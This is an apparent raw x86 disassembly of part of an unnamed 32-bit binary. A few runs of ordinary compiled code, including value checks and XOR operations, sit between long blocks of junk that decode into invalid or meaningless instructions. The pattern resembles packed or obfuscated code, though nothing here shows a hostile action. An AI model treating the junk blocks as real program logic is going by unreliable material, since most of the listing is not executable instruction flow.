  4028c8:	mov    ecx,DWORD PTR [ebp-0x14]
  4028cb:	mov    eax,DWORD PTR [ebp-0x8]
  4028ce:	mov    eax,DWORD PTR [eax]
  4028d0:	jmp    0x402bd6
  4028d5:	in     eax,dx
  4028d6:	outs   dx,BYTE PTR ds:[esi]
  4028d7:	out    0xf4,eax
  4028d9:	jae    0x40294c
  4028db:	std    
  4028dc:	jne    0x402955
  4028de:	lds    esi,FWORD PTR [edi]
  4028e0:	int3   
  4028e1:	xchg   esi,eax
  4028e2:	repnz dec eax
  4028e4:	pop    ds
  4028e5:	fisttp QWORD PTR [eax]
  4028e7:	jl     0x402965
  4028e9:	addr16 jle 0x402968
  4028ec:	jl     0x4028f4
  4028ee:	cmp    eax,0x2b74137b
  4028f3:	aaa    
  4028f4:	adc    ah,BYTE PTR [esi+0x4fdfe822]
  4028fa:	jmp    0x40294b
  4028fc:	add    esi,DWORD PTR [esi]
  4028fe:	test   eax,esi
  402900:	inc    edi
  402901:	enter  0xe510,0x44
  402905:	push   ss
  402906:	ror    DWORD PTR [ecx+edi*2-0x78],1
  40290a:	pop    ecx
  40290b:	push   ss
  40290c:	mov    ?,WORD PTR [edx]
  40290e:	xor    ebp,DWORD PTR [esi+0x7b]
  402911:	shr    bh,0xc5
  402914:	pop    ds
  402915:	push   edx
  402916:	sub    DWORD PTR [ebx],ecx
  402918:	jb     0x402977
  40291a:	mov    ebp,0x43a72580
  40291f:	pushf  
  402920:	sub    eax,0x85a7c691
  402925:	dec    ecx
  402926:	push   ss
  402927:	add    al,0x74
  402929:	xchg   ecx,eax
  40292a:	jb     0x40290a
  40292c:	xchg   DWORD PTR [eax],esp
  40292e:	sbb    al,0xd6
  402930:	xor    eax,0x36d20d90
  402935:	repz cdq 
  402937:	idiv   ecx
  402939:	sti    
  40293a:	popa   
  40293b:	loop   0x402979
  40293d:	into   
  40293e:	push   edi
  40293f:	mov    ecx,0xb1fce42d
  402944:	mov    DWORD PTR [eax-0x29],esi
  402947:	imul   BYTE PTR [esi-0x4d]
  40294a:	repnz (bad) 
  40294d:	mov    dl,0x9f
  40294f:	sar    DWORD PTR [ecx+0x67],cl
  402952:	mov    ebx,0xcd1cf80
  402957:	mov    ebx,0xcb567603
  40295c:	stc    
  40295d:	dec    esp
  40295e:	push   ss
  40295f:	imul   edi,DWORD PTR [edx],0x5f174afd
  402965:	int3   
  402966:	inc    ebx
  402967:	into   
  402968:	mov    al,0xea
  40296a:	in     al,0xb9
  40296c:	xchg   ebx,eax
  40296d:	inc    ebp
  40296e:	push   es
  40296f:	call   0xeef2:0x14fad188
  402976:	sbb    bh,BYTE PTR [eax-0x52]
  402979:	jg     0x402927
  40297b:	push   edi
  40297c:	pushf  
  40297d:	out    dx,eax
  40297e:	je     0x402952
  402980:	sar    DWORD PTR [edx],0xcc
  402983:	dec    edx
  402984:	mov    ebp,0xef148737
  402989:	add    bh,0x92
  40298c:	add    BYTE PTR [edx-0x269b2db5],bh
  402992:	popf   
  402993:	stos   DWORD PTR es:[edi],eax
  402994:	cli    
  402995:	jno    0x4029f0
  402997:	pop    ecx
  402998:	stos   DWORD PTR es:[edi],eax
  402999:	pushf  
  40299a:	inc    esi
  40299b:	arpl   sp,bp
  40299d:	push   edi
  40299e:	in     eax,0x75
  4029a0:	(bad)  
  4029a1:	loop   0x402923
  4029a3:	jg     0x402975
  4029a5:	ret    
  4029a6:	adc    BYTE PTR [ebx],dl
  4029a8:	xchg   edx,eax
  4029a9:	or     eax,DWORD PTR [edx]
  4029ab:	inc    ecx
  4029ac:	push   edx
  4029ad:	inc    ebx
  4029ae:	adc    al,0xd0
  4029b0:	aam    0xf8
  4029b2:	sbb    eax,0x918ce53b
  4029b7:	jmp    0x402a11
  4029b9:	jbe    0x4029dd
  4029bb:	sbb    eax,edi
  4029bd:	call   0x92827604
  4029c2:	aas    
  4029c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4029c4:	cmp    BYTE PTR [ebx+0x43],0xf
  4029c8:	mov    bl,dl
  4029ca:	leave  
  4029cb:	cmp    DWORD PTR [esi+0x347efe29],ebx
  4029d1:	dec    esi
  4029d2:	xchg   edi,eax
  4029d3:	fwait
  4029d4:	pop    eax
  4029d5:	js     0x402a55
  4029d7:	add    eax,0x1b8b3aee
  4029dc:	pop    esp
  4029dd:	jp     0x402a18
  4029df:	sbb    al,0xea
  4029e1:	call   0x6a1b:0x62f24859
  4029e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4029e9:	xor    BYTE PTR [ebp+0x77d7b072],ch
  4029ef:	shl    DWORD PTR [ebp-0x7],1
  4029f2:	mov    ds:0x3e1f8f4d,al
  4029f7:	mov    edi,0x6ef0a275
  4029fc:	gs (bad) 
  4029fe:	or     DWORD PTR [esi+0x29],esp
  402a01:	je     0x4029ac
  402a03:	inc    ebp
  402a04:	pop    ebx
  402a05:	ds pop ebp
  402a07:	stc    
  402a08:	icebp  
  402a09:	jmp    0x661157a2
  402a0e:	fwait
  402a0f:	sub    ebp,DWORD PTR es:[esi]
  402a12:	fbld   TBYTE PTR [edi+0x78]
  402a15:	jns    0x402a0d
  402a17:	sub    eax,0x1ce10b6c
  402a1c:	jmp    0xb2a13b80
  402a21:	in     al,dx
  402a22:	and    BYTE PTR [ebp+0x21],cl
  402a25:	jg     0x4029af
  402a27:	cmp    bh,BYTE PTR [edi]
  402a29:	adc    eax,0xffffffec
  402a2c:	retf   
  402a2d:	scas   eax,DWORD PTR es:[edi]
  402a2e:	int3   
  402a2f:	or     esi,DWORD PTR [esi-0x4e]
  402a32:	ret    0xe76d
  402a35:	xchg   esi,eax
  402a36:	jg     0x4029e3
  402a38:	adc    al,0x8
  402a3a:	sahf   
  402a3b:	in     al,0xe5
  402a3d:	xchg   edi,eax
  402a3e:	add    al,0xe3
  402a40:	cmp    ebx,DWORD PTR [ecx-0x6782f87f]
  402a46:	sub    ebp,DWORD PTR ds:0xadd37369
  402a4c:	or     BYTE PTR ds:0xd8c59c46,cl
  402a52:	mov    ds:0x76a02bb1,eax
  402a57:	sub    edi,DWORD PTR [esi]
  402a59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402a5a:	sbb    dl,BYTE PTR [esi-0x48]
  402a5d:	hlt    
  402a5e:	jecxz  0x402a69
  402a60:	xor    edx,esi
  402a62:	sbb    dh,BYTE PTR [esi+esi*4-0x59a611b2]
  402a69:	sbb    ah,BYTE PTR [ebp+0x70]
  402a6c:	inc    edi
  402a6d:	jecxz  0x402ab0
  402a6f:	jle    0x402a8c
  402a71:	fsub   QWORD PTR [ecx]
  402a73:	clc    
  402a74:	sub    DWORD PTR [eax+0x4b39720c],eax
  402a7a:	into   
  402a7b:	pop    ecx
  402a7c:	xor    ebp,DWORD PTR [esi]
  402a7e:	inc    esi
  402a7f:	psubb  mm3,mm2
  402a82:	mov    ds:0x1138046f,al
  402a87:	into   
  402a88:	test   eax,0x363a9df6
  402a8d:	lock mov ebx,0xf2e2830
  402a93:	sbb    BYTE PTR [edx],ch
  402a95:	add    DWORD PTR [edi],ebp
  402a97:	and    BYTE PTR [eax],dl
  402a99:	inc    edi
  402a9a:	ins    BYTE PTR es:[edi],dx
  402a9b:	jae    0x402b09
  402a9d:	or     eax,0x1268c3da
  402aa2:	or     BYTE PTR [edx-0x650d4afc],bl
  402aa8:	jmp    ebp
  402aaa:	in     al,dx
  402aab:	mov    dl,0xf0
  402aad:	cmp    esp,DWORD PTR ds:0x7441a969
  402ab3:	jmp    0x3b4e162
  402ab8:	push   ecx
  402ab9:	(bad)
  402abe:	pop    esp
  402abf:	ins    DWORD PTR es:[edi],dx
  402ac0:	call   0x7764:0x1b95dfb0
  402ac7:	mov    cl,0xf4
  402ac9:	xchg   ebp,eax
  402aca:	push   ss
  402acb:	pushf  
  402acc:	fsub   DWORD PTR [edi+ecx*4]
  402acf:	add    DWORD PTR [esp+ebp*2-0x400b93b1],ebp
  402ad6:	jne    0x402ae4
  402ad8:	sub    al,0x43
  402ada:	rcl    DWORD PTR [ebx-0x6c839579],1
  402ae0:	xchg   edi,eax
  402ae1:	pop    ds
  402ae2:	inc    esi
  402ae3:	mov    al,ds:0xce02168f
  402ae8:	and    eax,0x25ef679e
  402aed:	lods   eax,DWORD PTR ds:[esi]
  402aee:	push   0x21
  402af0:	xchg   DWORD PTR [ecx+eiz*8],edi
  402af3:	mov    cl,BYTE PTR [edx+eax*4]
  402af6:	leave  
  402af7:	pop    ss
  402af8:	adc    al,0xf7
  402afa:	fist   DWORD PTR [ebp-0x2fe9c3a8]
  402b00:	lds    eax,FWORD PTR [edx-0xc]
  402b03:	jl     0x402ae4
  402b05:	(bad)  
  402b06:	out    0x1b,al
  402b08:	fs std 
  402b0a:	jecxz  0x402b40
  402b0c:	cmp    al,ch
  402b0e:	pop    esi
  402b0f:	iret   
  402b10:	popf   
  402b11:	jb     0x402b17
  402b13:	or     DWORD PTR ds:[esi+0x254b79fd],0x61
  402b1b:	imul   eax,DWORD PTR [ecx+0x58],0xc6081699
  402b22:	fnstenv [ebp-0x3e]
  402b25:	cmp    cl,BYTE PTR [edx]
  402b27:	not    bh
  402b29:	stc    
  402b2a:	jno    0x402b14
  402b2c:	cmp    eax,0x1ab329ab
  402b31:	retf   
  402b32:	push   esp
  402b33:	mov    dl,0x8c
  402b35:	ss mov eax,0x55861de9
  402b3b:	xchg   esp,eax
  402b3c:	pop    ss
  402b3d:	sbb    bl,BYTE PTR ds:0x15dae91
  402b43:	add    DWORD PTR [edx],esi
  402b45:	pop    ss
  402b46:	pushf  
  402b47:	cld    
  402b48:	jmp    0xc62d6541
  402b4d:	sbb    ebp,DWORD PTR [esi-0x337e6591]
  402b53:	scas   al,BYTE PTR es:[edi]
  402b54:	inc    esi
  402b55:	add    esi,DWORD PTR [ecx+0x9]
  402b58:	(bad)  
  402b59:	and    cl,BYTE PTR ds:0x1f2bed6f
  402b5f:	shl    BYTE PTR [edx-0x4a],cl
  402b62:	mov    ds:0x6fed8fd8,eax
  402b67:	ficomp WORD PTR [ebp+eiz*8+0x3e5eefaa]
  402b6e:	stos   DWORD PTR es:[edi],eax
  402b6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b70:	xchg   ebp,eax
  402b71:	sub    BYTE PTR [edi+eiz*8-0x4a7b8a7b],dl
  402b78:	stos   DWORD PTR es:[edi],eax
  402b79:	(bad)  
  402b7a:	out    0x70,al
  402b7c:	sub    dl,BYTE PTR [ebp+0x56]
  402b7f:	mov    eax,ds:0x17491da4
  402b84:	les    ebp,FWORD PTR [eax+0x2f1bba11]
  402b8a:	push   ds
  402b8b:	pop    ebx
  402b8c:	sub    DWORD PTR [ebx+0x2d97667a],edx
  402b92:	in     al,dx
  402b93:	in     al,dx
  402b94:	repz add cl,BYTE PTR [esi]
  402b97:	add    bh,dh
  402b99:	pop    ebx
  402b9a:	sub    ch,BYTE PTR [ecx]
  402b9c:	xchg   edi,eax
  402b9d:	mov    al,0x62
  402b9f:	dec    ecx
  402ba0:	cwde   
  402ba1:	cli    
  402ba2:	xchg   ecx,eax
  402ba3:	or     edx,DWORD PTR [eax+edi*2]
  402ba6:	xor    bh,0xc0
  402ba9:	add    ebp,DWORD PTR [ecx]
  402bab:	outs   dx,DWORD PTR ds:[esi]
  402bac:	mov    esi,0x22c2a880
  402bb1:	push   eax
  402bb2:	ins    DWORD PTR es:[edi],dx
  402bb3:	mov    bh,0xe7
  402bb5:	(bad)  
  402bb6:	sahf   
  402bb7:	add    eax,0xeb573026
  402bbc:	pop    ss
  402bbd:	xchg   edi,eax
  402bbe:	mov    eax,0xd4e69de8
  402bc3:	mov    ah,0x7f
  402bc5:	mov    BYTE PTR [ecx],cl
  402bc7:	loope  0x402c0e
  402bc9:	jecxz  0x402bd9
  402bcb:	xchg   ebp,eax
  402bcc:	mov    ch,0x43
  402bce:	inc    ebx
  402bcf:	mov    edi,0x8ed1c1cc
  402bd4:	frstor [edx-0x72c3bf75]
  402bda:	or     al,0xcd
  402bdc:	js     0x402bde
  402bde:	add    BYTE PTR [eax],al
  402be0:	add    eax,ecx
  402be2:	mov    ecx,DWORD PTR [ebp-0x8]
  402be5:	mov    ecx,DWORD PTR [ecx]
  402be7:	mov    eax,DWORD PTR [eax+ecx*1]
  402bea:	mov    DWORD PTR [ebp-0x1c],eax
  402bed:	mov    eax,DWORD PTR [ebp+0x8]
  402bf0:	xor    eax,esi
  402bf2:	add    eax,edi
  402bf4:	mov    DWORD PTR [ebp-0x20],eax
  402bf7:	mov    eax,DWORD PTR [ebp+0x8]
  402bfa:	mov    ecx,DWORD PTR [ebp-0x1c]
  402bfd:	xor    eax,esi
  402bff:	add    eax,edi
  402c01:	cmp    ecx,eax
  402c03:	je     0x402f69
  402c09:	mov    eax,DWORD PTR [ebp-0x8]
  402c0c:	mov    ecx,DWORD PTR [ebp-0x1c]
  402c0f:	add    ecx,DWORD PTR [eax]
  402c11:	mov    DWORD PTR [ebp-0x20],ecx
  402c14:	mov    eax,DWORD PTR [ebp-0x20]
  402c17:	mov    ecx,DWORD PTR [ebp-0x8]
  402c1a:	mov    eax,DWORD PTR [eax+0xc]
  402c1d:	mov    ecx,DWORD PTR [ecx]
  402c1f:	mov    al,BYTE PTR [eax+ecx*1]
  402c22:	add    al,0x39
  402c24:	xor    al,0x45
  402c26:	cmp    al,0xc1
  402c28:	je     0x402c3f
  402c2e:	mov    eax,DWORD PTR [ebp+0x8]
  402c31:	mov    ecx,DWORD PTR [ebp-0x8]
  402c34:	xor    eax,esi
  402c36:	add    eax,edi
  402c38:	mov    DWORD PTR [ecx],eax
  402c3a:	jmp    0x402f69
  402c3f:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  402c46:	jmp    0x402f69
  402c4b:	mov    eax,DWORD PTR [ebp-0x8]
  402c4e:	mov    ecx,DWORD PTR [ebp-0x18]
  402c51:	mov    ecx,DWORD PTR [ecx]
  402c53:	mov    DWORD PTR [eax],ecx
  402c55:	mov    eax,DWORD PTR [ebp+0xc]
  402c58:	mov    eax,DWORD PTR [ebp+0x8]
  402c5b:	jmp    0x402f61
  402c60:	add    al,0x8f
  402c62:	and    ecx,0xffffff93
  402c65:	std    
  402c66:	bound  ebp,QWORD PTR [ecx-0x45]
  402c69:	or     DWORD PTR [edi+0x5d],eax
  402c6c:	sub    al,0x31
  402c6e:	push   0x13
  402c70:	les    edx,FWORD PTR ds:0x7e677c7c
  402c76:	jl     0x402cf4
  402c78:	jl     0x402c40
  402c7a:	xor    BYTE PTR [esi-0x2b],ah
  402c7d:	push   DWORD PTR [ebx+0x50]
  402c80:	iret   
  402c81:	jns    0x402c76
  402c83:	popa   
  402c84:	xchg   ecx,eax
  402c85:	sbb    edx,DWORD PTR [ebx+eax*4]
  402c88:	mov    esp,0xb62484b8
  402c8d:	adc    DWORD PTR [eax+0xd8c5d82],0x2471d314
  402c97:	xchg   edx,eax
  402c98:	sub    esp,DWORD PTR [eax-0x56]
  402c9b:	iret   
  402c9c:	inc    eax
  402c9d:	inc    eax
  402c9e:	pop    esp
  402c9f:	(bad)  
  402ca0:	(bad)  
  402ca1:	cmp    eax,0x9930a3a6
  402ca6:	call   0x4a82:0x100fb423
  402cad:	adc    BYTE PTR [eax+0x61a9646c],0x24
  402cb4:	adc    bh,dl
  402cb6:	push   ss
  402cb7:	add    eax,0x6916c6a8
  402cbc:	mov    ah,0xc5
  402cbe:	dec    ebp
  402cbf:	cmp    ecx,DWORD PTR [edx]
  402cc1:	jo     0x402cab
  402cc3:	stos   BYTE PTR es:[edi],al
  402cc4:	js     0x402d20
  402cc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402cc7:	rol    BYTE PTR [esi],cl
  402cc9:	sub    DWORD PTR [edx],0x4f6ba3e1
  402ccf:	loope  0x402d2e
  402cd1:	push   edx
  402cd2:	shl    DWORD PTR [esp+ebx*8],cl
  402cd5:	test   al,0x5f
  402cd7:	test   edi,esp
  402cd9:	cwde   
  402cda:	push   es
  402cdb:	dec    eax
  402cdc:	in     eax,0xd6
  402cde:	mov    dh,0x36
  402ce0:	test   eax,0xa4f5bda5
  402ce5:	adc    ch,BYTE PTR [edi]
  402ce7:	test   dh,dh
  402ce9:	dec    ecx
  402cea:	fxch   st(6)
  402cec:	cs dec ebp
  402cee:	neg    DWORD PTR [esi+0x25]
  402cf1:	and    esp,0x45bbb01a
  402cf7:	cmp    al,0x89
  402cf9:	loopne 0x402d5a
  402cfb:	loopne 0x402cf4
  402cfd:	cmp    bl,al
  402cff:	lahf   
  402d00:	mov    edi,ecx
  402d02:	mov    WORD PTR [ecx+0x50692baf],ds
  402d08:	pop    ebp
  402d09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d0b:	aas    
  402d0c:	mov    ch,0x7b
  402d0e:	mov    bh,BYTE PTR [edx+0x4c]
  402d11:	call   0x4ffa7b6f
  402d16:	div    BYTE PTR [edx]
  402d18:	addr16 loopne 0x402d32
  402d1b:	sbb    edx,DWORD PTR [edx+0x301dd28c]
  402d21:	cdq    
  402d22:	sbb    bl,BYTE PTR [edi-0x64]
  402d25:	std    
  402d26:	add    BYTE PTR [eax+0x7bb3c864],dh
  402d2c:	sbb    al,dl
  402d2e:	xchg   esp,eax
  402d2f:	jns    0x402d00
  402d31:	cld    
  402d32:	(bad)  
  402d33:	jmp    0x402d7c
  402d35:	aam    0x87
  402d37:	ror    DWORD PTR [ecx-0x7],cl
  402d3a:	mov    eax,ds:0xf81a93cc
  402d3f:	test   BYTE PTR [eax],0x29
  402d42:	pusha  
  402d43:	out    dx,al
  402d44:	test   DWORD PTR [ebx],esp
  402d46:	and    al,bh
  402d48:	mov    tr6,esp
  402d4b:	imul   esp,DWORD PTR [ebp+0xcefd641],0xffffffaa
  402d52:	push   edi
  402d53:	mov    WORD PTR [edi+0x11dd74b7],fs
  402d59:	(bad)  
  402d5a:	mov    ebx,0xd8071da5
  402d5f:	pop    edx
  402d60:	push   0x4
  402d62:	pop    esi
  402d63:	fst    DWORD PTR [ebx-0x6b92bca5]
  402d69:	sub    al,al
  402d6b:	inc    ecx
  402d6c:	int3   
  402d6d:	prefetch (bad)
  402d6e:	or     eax,0x2eb0d9e7
  402d73:	jecxz  0x402dc4
  402d75:	add    al,0xd2
  402d77:	nop
  402d78:	mov    ch,BYTE PTR [eax+0x3c8f3ba9]
  402d7e:	mov    ah,0xf0
  402d80:	dec    edi
  402d81:	ret    0xdb7e
  402d84:	in     eax,dx
  402d85:	lea    ecx,[esi-0x78ed7cb2]
  402d8b:	xchg   esi,eax
  402d8c:	lods   eax,DWORD PTR ds:[esi]
  402d8d:	les    ebp,FWORD PTR [edx+0x6c6885b0]
  402d93:	xchg   ecx,eax
  402d94:	nop
  402d95:	xchg   ebp,eax
  402d96:	pop    esi
  402d97:	les    esi,FWORD PTR [esp+esi*4+0x3]
  402d9b:	add    ebp,DWORD PTR [edi+0x1568650b]
  402da1:	jne    0x402e1e
  402da3:	outs   dx,BYTE PTR ds:[esi]
  402da4:	xor    al,0xf8
  402da6:	jp     0x402d9f
  402da8:	sub    BYTE PTR [edx+0x9712288],al
  402dae:	or     bh,dl
  402db0:	cs dec eax
  402db2:	mov    esp,0x8eb39c7c
  402db7:	pop    esp
  402db8:	ss inc ebx
  402dba:	ja     0x402dc8
  402dbc:	xchg   esi,eax
  402dbd:	fcom   DWORD PTR [edi+0x6116994f]
  402dc3:	and    al,0xa9
  402dc5:	test   esp,ebp
  402dc7:	add    BYTE PTR ds:0xdd12f366,0xaf
  402dce:	pop    esp
  402dcf:	jmp    0x402d9f
  402dd1:	sbb    al,dl
  402dd3:	xlat   BYTE PTR ds:[ebx]
  402dd4:	xchg   ebp,eax
  402dd5:	fiadd  DWORD PTR [ecx-0x4b3cf3cd]
  402ddb:	xacquire xchg DWORD PTR [edi],ebx
  402dde:	sub    edi,DWORD PTR [edx+0x26]
  402de1:	xor    al,0xb0
  402de3:	pop    ecx
  402de4:	push   es
  402de5:	fmul   st,st(1)
  402de7:	ins    BYTE PTR es:[edi],dx
  402de8:	scas   eax,DWORD PTR es:[edi]
  402de9:	sub    eax,DWORD PTR [esi+eax*2-0x5f]
  402ded:	add    BYTE PTR [esi-0x552a852d],dh
  402df3:	mov    BYTE PTR [edx-0xa51d323],bl
  402df9:	jo     0x402d89
  402dfb:	ficomp WORD PTR [edx]
  402dfd:	scas   eax,DWORD PTR es:[edi]
  402dfe:	xchg   ecx,eax
  402dff:	fwait
  402e00:	dec    ebx
  402e01:	ss push cs
  402e03:	jmp    0x402e5f
  402e05:	fidiv  WORD PTR [edx]
  402e07:	stos   BYTE PTR es:[edi],al
  402e08:	pop    ebx
  402e09:	stc    
  402e0a:	lods   eax,DWORD PTR ds:[esi]
  402e0b:	xchg   ebp,eax
  402e0c:	lock jne 0x402e6a
  402e0f:	inc    esi
  402e10:	retf   
  402e11:	js     0x402e81
  402e13:	jns    0x402e1a
  402e15:	aam    0xc3
  402e17:	test   eax,0x4048c72e
  402e1c:	ins    DWORD PTR es:[edi],dx
  402e1d:	jecxz  0x402e84
  402e1f:	ins    BYTE PTR es:[edi],dx
  402e20:	daa    
  402e21:	dec    edi
  402e22:	mov    ds:0xf8a0b664,al
  402e27:	and    edi,DWORD PTR [ecx+ebp*2+0x3a50f0e0]
  402e2e:	pop    edi
  402e2f:	push   DWORD PTR [ebp+0x445ee4b]
  402e35:	leave  
  402e36:	jns    0x402dd5
  402e38:	loope  0x402e53
  402e3a:	ins    DWORD PTR es:[edi],dx
  402e3b:	jbe    0x402e1f
  402e3d:	jmp    0xda86:0x31da463c
  402e44:	or     BYTE PTR ds:0x327ea5bf,0xcb
  402e4b:	enter  0xc1b9,0x39
  402e4f:	and    DWORD PTR [ebx+0x7b6f62a2],edi
  402e55:	and    esi,edi
  402e57:	jo     0x402dde
  402e59:	lods   al,BYTE PTR ds:[esi]
  402e5a:	(bad)  
  402e5d:	retf   
  402e5e:	ins    DWORD PTR es:[edi],dx
  402e5f:	mov    eax,ds:0x2c31aa9d
  402e64:	imul   edi,DWORD PTR [edx],0xffffffbc
  402e67:	adc    DWORD PTR [ebx],eax
  402e69:	mov    dl,0x7d
  402e6b:	dec    edi
  402e6c:	xor    eax,0x9c4332b8
  402e71:	mov    ecx,0x785e9f5a
  402e76:	das    
  402e77:	stc    
  402e78:	jge    0x402e35
  402e7a:	push   eax
  402e7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e7c:	xchg   edx,eax
  402e7d:	push   esi
  402e7e:	test   eax,0x39869fe7
  402e83:	rcr    BYTE PTR [eax+0x4a7246df],1
  402e89:	fcomip st,st(6)
  402e8b:	(bad)  
  402e8c:	cwde   
  402e8d:	mov    ebp,0x59422706
  402e92:	sar    BYTE PTR [ebx+0x69],0x11
  402e96:	sbb    ebx,DWORD PTR [esi+ebx*8]
  402e99:	nop
  402e9a:	mov    ecx,0xcbc0bd7e
  402e9f:	mov    al,ds:0xb274b151
  402ea4:	jno    0x402e43
  402ea6:	and    al,0x77
  402ea8:	call   0x4131:0x91161630
  402eaf:	arpl   WORD PTR [esi],ax
  402eb1:	dec    ebx
  402eb2:	loopne 0x402eff
  402eb4:	fimul  DWORD PTR [esi-0x7555b0a9]
  402eba:	sbb    eax,DWORD PTR [ebx+eax*2+0x3]
  402ebe:	xor    dl,ah
  402ec0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ec1:	retf   
  402ec2:	xchg   edi,eax
  402ec3:	fcom   QWORD PTR [eax+0x267ccaca]
  402ec9:	call   0x18a8:0x6667a1
  402ed0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ed2:	jbe    0x402f07
  402ed4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ed5:	mov    ss,WORD PTR [ebx+0x4b5671b4]
  402edb:	jp     0x402ef3
  402edd:	call   DWORD PTR [edx-0x5a]
  402ee0:	outs   dx,BYTE PTR ds:[esi]
  402ee1:	sub    eax,0xcbfb413f
  402ee6:	push   cs
  402ee7:	out    dx,eax
  402ee8:	adc    DWORD PTR [eax-0x46],0x15
  402eec:	leave  
  402eed:	ror    BYTE PTR [eax-0x4e],1
  402ef0:	ret    
  402ef1:	dec    ebp
  402ef2:	pop    esp
  402ef3:	ins    BYTE PTR es:[edi],dx
  402ef4:	and    ebx,DWORD PTR [edx-0x1a]
  402ef7:	xchg   esi,eax
  402ef8:	xchg   edi,eax
  402ef9:	push   es
  402efa:	cmp    DWORD PTR ds:0x4bd60443,esi
  402f00:	mov    eax,0xc2ccce98
  402f05:	mov    bl,0xa5
  402f07:	out    0x0,al
  402f09:	jmp    FWORD PTR [ecx+0x5d]
  402f0c:	dec    di
  402f0e:	cmp    esp,DWORD PTR [esi]
  402f10:	xchg   edx,eax
  402f11:	test   al,0xfe
  402f13:	arpl   WORD PTR [ebx-0x78],cx
  402f16:	add    eax,0x8113e20b
  402f1b:	xchg   edi,eax
  402f1c:	imul   ebp,DWORD PTR [ebx+0x3b],0xffffffb5
  402f20:	pop    ss
  402f21:	fucomi st,st(5)
  402f23:	xchg   esi,eax
  402f24:	jecxz  0x402fa0
  402f26:	sbb    edx,DWORD PTR [bp+0x702a]
  402f2b:	icebp  
  402f2c:	ja     0x402fab
  402f2e:	sub    al,0x9f
  402f30:	xchg   esi,eax
  402f31:	sahf   
  402f32:	sbb    al,0xc1
  402f34:	adc    eax,0xf572e9b2
  402f39:	pop    edx
  402f3a:	sub    eax,0xc49f072b
  402f3f:	adc    esp,DWORD PTR [ecx]
  402f41:	or     eax,0xc5e14117
  402f46:	mov    ecx,DWORD PTR [eax]
  402f48:	scas   al,BYTE PTR es:[edi]
  402f49:	fisubr DWORD PTR [edi-0x2c]
  402f4c:	inc    edx
  402f4d:	sbb    ah,BYTE PTR [edx-0x6df9d500]
  402f53:	adc    al,0xad
  402f55:	test   BYTE PTR [ecx+0x5d97ff7a],0x8f
  402f5c:	sub    cl,BYTE PTR [ebp-0x7910c9]
  402f62:	jne    0x402f5c
  402f64:	call   0x4062cd
  402f69:	mov    eax,DWORD PTR [ebp-0xc]
  402f6c:	cmp    eax,ebx
  402f6e:	je     0x401817
  402f74:	mov    eax,DWORD PTR [ebp-0x8]
  402f77:	mov    eax,DWORD PTR [eax]
  402f79:	pop    edi
  402f7a:	pop    esi
  402f7b:	jmp    0x403281
  402f80:	imul   ebx,DWORD PTR [eax],0x54
  402f83:	cmc    
  402f84:	push   edi
  402f85:	jge    0x403004
  402f87:	call   0xd163:0x1360eb95
  402f8e:	mov    ah,0xf5
  402f90:	das    
  402f91:	push   ss
  402f92:	jl     0x403010
  402f94:	addr16 jle 0x403013
  402f97:	jl     0x402f89
  402f99:	sub    BYTE PTR [edx-0x21],bl
  402f9c:	and    eax,0x971f5492
  402fa1:	inc    eax
  402fa2:	sahf   
  402fa3:	(bad)  
  402fa5:	push   ebx
  402fa6:	inc    esi
  402fa7:	fadd   QWORD PTR [edx+edx*1]
  402faa:	inc    esi
  402fab:	adc    ebx,esi
  402fad:	lods   eax,DWORD PTR ds:[esi]
  402fae:	loope  0x402fe0
  402fb0:	enter  0x7bbc,0x98
  402fb4:	sbb    BYTE PTR [edi+0x6815d836],cl
  402fba:	addr16 inc esi
  402fbc:	ins    BYTE PTR es:[edi],dx
  402fbd:	push   ebx
  402fbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402fbf:	sbb    DWORD PTR [eax],esp
  402fc1:	pop    ds
  402fc2:	xor    edi,DWORD PTR [ecx-0x58]
  402fc5:	mov    ebp,0x1bacafa1
  402fca:	inc    edi
  402fcb:	cmp    bh,BYTE PTR [edi+0x3]
  402fce:	jmp    0x402faa
  402fd0:	lahf   
  402fd1:	stc    
  402fd2:	int3   
  402fd3:	aam    0x8
  402fd5:	int    0x85
  402fd7:	call   0x371c:0x229e3d20
  402fde:	pushf  
  402fdf:	(bad)  
  402fe0:	or     eax,0x54f08cb5
  402fe5:	xchg   edi,eax
  402fe6:	adc    ebp,DWORD PTR [ecx+0x40]
  402fe9:	adc    ah,ah
  402feb:	shl    DWORD PTR [eax-0x338dbb63],0x8e
  402ff2:	and    BYTE PTR [ebp-0x6c],dh
  402ff5:	push   0xc5c232db
  402ffa:	xor    edx,DWORD PTR [ebx-0x4e]
  402ffd:	and    DWORD PTR [ebx],ebp
  402fff:	mov    dh,0x4d
  403001:	out    0x62,eax
  403003:	int    0xec
  403005:	das    
  403006:	mov    ah,0xf9
  403008:	cmp    eax,0x7c1a2172
  40300d:	call   0xf86a15c9
  403012:	sub    edx,DWORD PTR [ecx]
  403014:	aas    
  403015:	mov    BYTE PTR [esi+eax*1],bl
  403018:	mov    WORD PTR [ebp+0x47749630],fs
  40301e:	popf   
  40301f:	pop    es
  403020:	jmp    0x40304e
  403022:	(bad)  
  403023:	push   cs
  403024:	adc    edi,DWORD PTR [edx+0x4818a81d]
  40302a:	lods   eax,DWORD PTR ds:[esi]
  40302b:	sub    DWORD PTR [esi],edx
  40302d:	add    ebx,DWORD PTR [esi-0x23b5b988]
  403033:	int3   
  403034:	outs   dx,DWORD PTR ds:[esi]
  403035:	or     DWORD PTR [edx+eax*1],ebx
  403038:	(bad)
  40303b:	dec    esi
  40303c:	mov    bh,BYTE PTR [ecx]
  40303e:	clc    
  40303f:	mov    cl,0x71
  403041:	stc    
  403042:	fwait
  403043:	cmc    
  403044:	mov    BYTE PTR ds:0x12ef0146,bh
  40304a:	and    eax,DWORD PTR [ecx]
  40304c:	aad    0xd9
  40304e:	iret   
  40304f:	or     edi,DWORD PTR [esi-0x1c276e94]
